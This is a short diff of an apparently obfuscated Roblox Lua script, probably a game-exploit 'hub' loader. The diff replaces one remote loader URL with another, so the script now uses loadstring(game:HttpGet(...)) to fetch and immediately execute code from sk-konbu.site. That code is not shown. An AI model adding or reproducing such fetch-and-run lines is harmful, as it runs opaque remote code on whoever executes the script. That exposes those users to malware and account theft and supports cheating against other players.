@@ -30,4 +30,4 @@ task.spawn(function()
     _0x_DO_WORK()
 end)
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
+loadstring(game:HttpGet("https://sk-konbu.site/SKHub/v1.txt"))()
